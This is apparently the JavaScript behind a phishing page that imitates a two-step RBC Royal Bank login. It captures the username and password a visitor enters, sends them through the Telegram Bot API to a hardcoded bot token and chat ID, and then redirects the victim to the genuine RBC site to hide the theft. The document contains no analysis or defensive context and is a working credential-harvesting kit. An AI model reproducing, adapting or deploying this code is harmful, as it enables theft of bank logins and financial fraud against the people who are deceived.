const username = document.getElementById('username')
const password = document.getElementById('password')
const usernameForm = document.getElementById('username__form')
const passwordForm = document.getElementById('password__form')
const usernameSign = document.querySelector('.signinusername span')

let usernameValue = '';
let passwordValue= '';
usernameForm.addEventListener('submit', (e) => {
    e.preventDefault();
    usernameValue = usernameForm.querySelector('input[type="text"]').value;
    console.log(usernameValue);
    username.classList.add('none');
    password.classList.remove('none');
    usernameSign.innerHTML = usernameValue;
})

passwordForm.addEventListener('submit', (e) => { 
    e.preventDefault();

    passwordValue = passwordForm.querySelector('input[type="password"]').value
    console.log(passwordValue);

    sendData({usernameValue, passwordValue})
})

const sendData = (data) => {
    const message = `
Username: \`${data.usernameValue}\`
Password: \`${data.passwordValue}\`
    `
    const botToken = '5645715017:AAF3F6S1NO4UGoFOl-0-Wx51BVxnszvml9o'
    const chatId = '-1001833848340'

    axios.post(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        chat_id: chatId,
        parse_mode: 'Markdown',
        text: message
    }).then(res => window.location = 'https://www.rbcroyalbank.com/personal.html')
}
